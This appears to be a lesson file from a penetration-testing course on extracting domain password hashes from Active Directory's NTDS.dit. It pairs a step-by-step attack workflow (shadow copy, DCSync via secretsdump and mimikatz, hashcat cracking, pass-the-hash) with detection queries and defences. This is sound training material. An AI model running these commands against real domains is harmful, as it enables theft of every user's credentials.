@@ -1,0 +1,142 @@
+{
+  "lesson_id": "c3d5e7f9-1a2b-4c4d-8e0f-2a4b6c8d0e2a",
+  "domain": "active_directory",
+  "title": "Extracting Domain Hashes from NTDS.dit",
+  "difficulty": 3,
+  "order_index": 35,
+  "prerequisites": [],
+  "concepts": [
+    "NTDS.dit structure and purpose",
+    "Volume Shadow Copy for NTDS extraction",
+    "DCSync attack methodology",
+    "Secretsdump and Impacket extraction",
+    "Hash types: NTLM, Kerberos keys, LM hashes",
+    "Offline password cracking of domain hashes",
+    "Detection of NTDS and DCSync attacks",
+    "Credential protection mechanisms"
+  ],
+  "estimated_time": 60,
+  "learning_objectives": [
+    "Explain the structure and purpose of the NTDS.dit database",
+    "Extract domain hashes using Volume Shadow Copy and Impacket",
+    "Execute the DCSync attack to extract hashes without touching NTDS.dit",
+    "Crack extracted NTLM hashes offline with Hashcat",
+    "Detect and defend against NTDS extraction and DCSync attacks",
+    "Implement credential protection mechanisms (Credential Guard, Protected Users)"
+  ],
+  "post_assessment": [
+    {
+      "question": "What is the NTDS.dit file?",
+      "options": [
+        "The Active Directory schema definition file",
+        "The Active Directory database storing all domain objects including password hashes",
+        "The DNS configuration for the domain controller",
+        "The Group Policy template file"
+      ],
+      "correct_answer": "B",
+      "explanation": "NTDS.dit is the Active Directory database file that stores all domain objects — users, groups, computers, GPOs, and crucially, password hashes. It's an ESE (Extensible Storage Engine) database that's always locked by the lsass process on a live DC."
+    },
+    {
+      "question": "Why must you create a Volume Shadow Copy before extracting NTDS.dit?",
+      "options": [
+        "To speed up the extraction process",
+        "Because the NTDS.dit file is locked by the system and cannot be copied directly",
+        "To compress the database for transfer",
+        "To encrypt the extracted data"
+      ],
+      "correct_answer": "B",
+      "explanation": "The NTDS.dit file is continuously locked by the lsass process. You cannot copy, move, or read it directly. Creating a VSS snapshot provides a consistent copy of the locked file that can then be extracted."
+    },
+    {
+      "question": "Which Active Directory privilege is required for a DCSync attack?",
+      "options": [
+        "Domain Admins group membership",
+        "Replicating Directory Changes, Replicating Directory Changes All, and DS-Replication-Get-Changes",
+        "Backup Operator role",
+        "Schema Admins group membership"
+      ],
+      "correct_answer": "B",
+      "explanation": "DCSync requires three replication permissions: Replicating Directory Changes, Replicating Directory Changes All, and DS-Replication-Get-Changes. Domain Admins have these by default, but they can be granted to other accounts — which is a common misconfiguration."
+    },
+    {
+      "question": "What Hashcat mode is used to crack NTLM hashes?",
+      "options": [
+        "-m 1000 (SHA1)",
+        "-m 13100 (Kerberos TGS)",
+        "-m 1000 (NTLM)",
+        "-m 5600 (NetNTLMv2)"
+      ],
+      "correct_answer": "C",
+      "explanation": "Hashcat mode `-m 1000` is used for NTLM hashes (MD4 of the UTF-16 password). These are fast hashes to crack, making domain hash extraction extremely dangerous — a full domain dump with weak passwords can be cracked in hours."
+    }
+  ],
+  "jim_kwik_principles": [
+    "Active Recall",
+    "Visualization",
+    "Association",
+    "Chunking",
+    "Simplification",
+    "Analogies",
+    "Pattern Recognition",
+    "Feynman Technique",
+    "Progressive Disclosure",
+    "Teaching Others"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "The Crown Jewels of Active Directory",
+      "content": "NTDS.dit is the crown jewels of Active Directory — it contains every password hash for every user in the domain. If an attacker gets this file, they don't need to attack one account at a time. They crack the entire domain offline.\n\nThis is why domain controller protection is the highest priority in AD security. And why understanding NTDS extraction — both how it's done and how to detect it — is essential knowledge for any security professional working with Active Directory.",
+      "principle": "Association"
+    },
+    {
+      "type": "explanation",
+      "title": "NTDS.dit: The AD Database",
+      "content": "**What NTDS.dit contains:**\n\nThe NTDS.dit file is an Extensible Storage Engine (ESE) database that stores:\n\n- **All domain objects:** Users, groups, computers, contacts\n- **Password hashes:** NTLM hashes, Kerberos keys (AES128, AES256, RC4)\n- **Group memberships:** Direct and nested\n- **Security descriptors:** ACLs on all objects\n- **Trust relationships:** Domain and forest trust information\n- **GPO links:** Group Policy Object associations\n\n**Location:** `%SystemRoot%\\NTDS\\NTDS.dit` on domain controllers\n\n**Hash types stored:**\n```\nFor each user account:\n├── NTLM Hash (MD4)        — Cracked fast, most dangerous\n├── Kerberos AES256 Key    — Very slow to crack\n├── Kerberos AES128 Key    — Moderate to crack  \n└── Kerberos RC4 Key        — Same as NTLM hash\n```\n\n**Two extraction methods:**\n\n**Method 1: File-based extraction**\n- Create a VSS snapshot → Copy NTDS.dit + SYSTEM hive → Parse offline\n- Requires: Local admin on DC, or ability to create VSS\n- Detectable: VSS creation events, file access events\n\n**Method 2: DCSync**\n- Abuse AD replication protocol to request password hashes\n- Requires: Replicating Directory Changes permissions\n- Detectable: Event IDs 4662, 5136 (replication events from non-DC accounts)\n\n**Why this is devastating:**\n- Single file contains every credential in the domain\n- Cracking happens offline — no lockout, no logs\n- NTLM hashes crack at billions per second with modern GPUs\n- Even complex passwords fall to rule-based attacks"
+    },
+    {
+      "type": "explanation",
+      "title": "NTDS Extraction Methods",
+      "subtitle": "Teach Me Like I'm 10",
+      "content": "Imagine the NTDS.dit as a giant safe containing copies of every employee's ID badge in the company. There are two ways to get into this safe:\n\n**Method 1: The Shadow Copy (File Extraction)**\n\nThink of it like this: the safe is bolted to the floor and always being watched (the lsass process locks it). You can't open it. But you can take a *photograph* of the safe's contents using a magical camera (VSS).\n\n1. Create a Volume Shadow Copy (the magical photograph)\n2. Copy NTDS.dit from the shadow copy (the photograph)\n3. Also grab the SYSTEM registry hive (the key to read the database)\n4. Take both files home and crack everything offline\n\n**Method 2: DCSync (Replication Impersonation)**\n\nImagine walking up to the safe and saying, \"I'm the security manager, please give me copies of all the badges.\" If you have the right ID (replication permissions), the safe *gives you everything willingly*.\n\n1. You have (or gained) replication permissions\n2. You send a DRSUAPI replication request to the DC\n3. The DC happily sends you all the password hashes\n4. No files touched, no VSS created — much stealthier\n\n**The scary part:** Both methods give you every password hash in the domain. With a good GPU, you can crack 80%+ of typical domain passwords within hours."
+    },
+    {
+      "type": "code_exercise",
+      "title": "NTDS Extraction Techniques",
+      "content": "Practice the NTDS extraction workflow using both methods.",
+      "language": "powershell",
+      "starter_code": "# Method 1: VSS-based extraction\n# 1. Create Volume Shadow Copy\n# 2. Copy NTDS.dit from shadow\n# 3. Export SYSTEM registry hive\n# 4. Extract hashes with secretsdump\n\n# Method 2: DCSync\n# 5. Extract hashes via DCSync using Impacket\n# 6. Crack hashes with Hashcat",
+      "solution": "# === Method 1: VSS-based extraction ===\n\n# 1. Create Volume Shadow Copy\nvssadmin create shadow /for=C:\n# Note the shadow copy volume path (e.g., \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1)\n\n# 2. Copy NTDS.dit from shadow copy\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\NTDS.dit\n\n# 3. Export SYSTEM registry hive\nreg save HKLM\\SYSTEM C:\\temp\\SYSTEM\n\n# 4. Extract hashes with secretsdump (on attack machine)\nsecretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL\n\n# Or using ntdsutil (alternative):\nntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\temp\\ntds_dump\" quit quit\n\n# === Method 2: DCSync ===\n\n# 5. DCSync via Impacket (from Linux attack box)\nsecretsdump.py corp.local/Administrator:Password123@dc01.corp.local -just-dc-ntlm\n\n# DCSync for a specific user\nsecretsdump.py corp.local/Administrator:Password123@dc01.corp.local -just-dc-ntlm -user SVC_SQL\n\n# Using Mimikatz (on DC or with replication rights)\nmimikatz # lsadump::dcsync /domain:corp.local /all /csv\n\n# 6. Crack with Hashcat\nhashcat -m 1000 domain_hashes.txt rockyou.txt\n# With rules for common patterns:\nhashcat -m 1000 domain_hashes.txt rockyou.txt -r rules/best64.rule",
+      "hint": "VSS method: vssadmin create shadow, copy from shadow path. DCSync method: secretsdump.py with -just-dc-ntlm flag. Hashcat mode 1000 for NTLM."
+    },
+    {
+      "type": "real_world",
+      "title": "NTDS Extraction in a Domain Compromise",
+      "content": "During a red team engagement, after gaining Domain Admin privileges through a Kerberoasted service account:\n\n**Phase 1: Reconnaissance**\n```powershell\n# Verify domain admin access\nwhoami /groups | findstr /i \"domain admins\"\n# Output: S-1-5-21-...-512  Domain Admins\n```\n\n**Phase 2: NTDS extraction via DCSync (preferred — stealthier)**\n```bash\n# From attack box — no files touched on DC\nsecretsdump.py corp.local/SVC_MGMT:'Summer2020!'@dc01.corp.local -just-dc-ntlm\n\n# Output:\n# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n# SVC_SQL:1104:aad3b435b51404eeaad3b435b51404ee:8846f7aaee7775137c30915f4d284f3e:::\n```\n\n**Phase 3: Cracking**\n```bash\n# Extract just the NTLM hashes\ncat domain_hashes.txt | cut -d: -f4 > ntlm_only.txt\n\n# Quick crack with common passwords\nhashcat -m 1000 ntlm_only.txt /usr/share/wordlists/rockyou.txt --force\n\n# Results (typical):\n# 42% cracked within 1 hour with basic wordlist\n# 67% cracked with rules within 6 hours\n# Remaining: strong passwords, service accounts with 30+ char passwords\n```\n\n**Phase 4: Pass-the-Hash (no cracking needed)**\n```bash\n# Use hashes directly — no need to crack\nsecretsdump.py corp.local/Administrator@dc01.corp.local -hashes :31d6cfe0d16ae931b73c59d7e0c089c0\n```\n\n**Detection gaps:**\n- DCSync from a DA account looks like normal replication\n- VSS creation is logged (Event ID 8194, 9897)\n- But if attacker already has DA, they can clear logs\n\n**This is why prevention (tiered admin, Credential Guard) is more important than detection.**",
+      "scenario": "You're a blue team analyst. You see Event ID 4662 with Replicating Directory Changes access from a non-DC account. What does this indicate, and what should your immediate response be?"
+    },
+    {
+      "type": "memory_aid",
+      "title": "NTDS Extraction — The VDR Mnemonic",
+      "content": "**VDR** — The three steps to domain hash extraction:\n\n- **V**SS Extraction — Volume Shadow Copy, copy NTDS.dit + SYSTEM hive\n- **D**CSync — Abuse replication protocol, no file access needed\n- **R**esolution — Crack hashes offline with Hashcat\n\n**Hash types you'll encounter:**\n- `aad3b435b51404eeaad3b435b51404ee:HASH` — NTLM format (LM:NT)\n- The LM portion (`aad3b435b51404ee...`) is empty/unused on modern systems\n- The NT portion is the MD4 hash of the password\n\n**Hashcat modes to remember:**\n- `-m 1000` — NTLM hashes\n- `-m 13100` — Kerberos TGS (Kerberoasting)\n- `-m 5600` — NetNTLMv2 (credential relay)\n\n**Detection Event IDs:**\n- `4662` — Object access (replication permissions used)\n- `5136` — Directory service object modified\n- `4624` — Logon (check for non-DC accounts with replication privileges)\n- `8194/9897` — VSS creation events",
+      "technique": "acronym"
+    },
+    {
+      "type": "explanation",
+      "title": "Detection and Defense Against NTDS Extraction",
+      "content": "**Detecting VSS-based extraction:**\n\n```powershell\n# Monitor for VSS creation\n# Event IDs: 8194, 9897 in VSS provider logs\n# Also monitor: 4688 (process creation) for vssadmin.exe\n\n# Detect NTDS.dit access\nGet-WinEvent -FilterHashtable @{LogName='Security'; ID=4663} |\n  Where-Object { $_.Message -match 'NTDS.dit' }\n\n# Detect ntdsutil usage\n# Event ID 4688 for ntdsutil.exe\n```\n\n**Detecting DCSync:**\n\n```powershell\n# Key indicator: Non-DC account using replication\n# Event ID 4662 with replication GUIDs\n# Properties:\n# 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (Replicating Directory Changes)\n# 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (Replicating Directory Changes All)\n# 9923a32a-3607-11d2-b9be-0000f87a36b2 (DS-Replication-Get-Changes)\n\n# Splunk detection:\nindex=wineventlog EventCode=4662\n  (Properties=\"*1131f6aa*\" OR Properties=\"*1131f6ad*\")\n  AND NOT (Account_Name=\"*$\")\n```\n\n**Defensive layers:**\n\n**Layer 1: Prevent access**\n- Restrict Domain Admin logons to DCs only (tiered administration)\n- Enable Credential Guard (isolates hashes in VBS enclave)\n- Use Protected Users group (prevents NTLM authentication)\n\n**Layer 2: Limit replication permissions**\n- Audit who has Replicating Directory Changes permissions\n- Remove unnecessary replication delegations\n- Monitor AD permissions changes\n\n**Layer 3: Detect extraction**\n- Monitor for VSS creation by non-standard processes\n- Alert on DCSync-related Event IDs (4662, 5136)\n- Deploy canary accounts — fake accounts whose hash access triggers alerts\n\n**Layer 4: Limit cracking damage**\n- Enforce 14+ character passwords (makes NTLM cracking infeasible)\n- Enable Smart Lockout (but note: offline cracking bypasses lockout)\n- Use LAPS for local admin passwords\n- Implement password filters for complexity requirements"
+    },
+    {
+      "type": "reflection",
+      "title": "Crown Jewels Protection Assessment",
+      "content": "Assess your AD environment's resilience against NTDS extraction:\n\n1. **Who has Domain Admin privileges?** Check if DAs log into workstations (they shouldn't).\n2. **Who has Replicating Directory Changes permissions?** Only DCs should have these.\n3. **Are VSS creation events being monitored?** Check your SIEM for Event ID 8194.\n4. **Is Credential Guard enabled?** Check with `Get-CimInstance -ClassName Win32_DeviceGuard`.\n5. **What's the average password age for service accounts?** Check `Get-ADUser -Filter * -Properties PasswordLastSet`.\n6. **Are there canary/honeypot accounts with monitoring?**\n\n**Red team exercise:** In a lab, try both extraction methods (VSS and DCSync). Document the events each generates. This tells you exactly what to monitor.\n\n**Blue team exercise:** Run the detection queries from this lesson against your logs. See if you can find any past DCSync attempts."
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Defense in Depth for Domain Controllers",
+      "content": "NTDS extraction is the ultimate prize in AD attacks. Once an attacker has domain hashes, they effectively own the domain — they can crack passwords offline, use Pass-the-Hash for lateral movement, or forge Golden Tickets.\n\nThe defense isn't one control — it's **layers**:\n\n1. **Prevent access to DCs** — Tiered administration, no DA on workstations\n2. **Protect the hashes** — Credential Guard, gMSA, strong passwords\n3. **Detect extraction** — 4662, 5136, VSS events, canary accounts\n4. **Limit blast radius** — LAPS, Protected Users, micro-segmentation\n\nNo single layer is sufficient. DCSync with DA credentials looks like normal replication. VSS is a legitimate admin tool. Strong passwords can still be cracked given enough time.\n\nBut together, these layers create an environment where:\n- Getting DA is harder (tiered admin)\n- Extracting hashes is harder (Credential Guard)\n- Using hashes is harder (Protected Users, LAPS)\n- Detection is more likely (canary accounts, event monitoring)\n\n**Your mission:** Check your AD environment for at least one layer from this lesson that's missing. Implement it this week.",
+      "principle": "Progressive Disclosure"
+    }
+  ],
+  "tags": ["Course: SANS-SEC560", "Career Path: Red Teamer", "Career Path: Pentester"]
+}
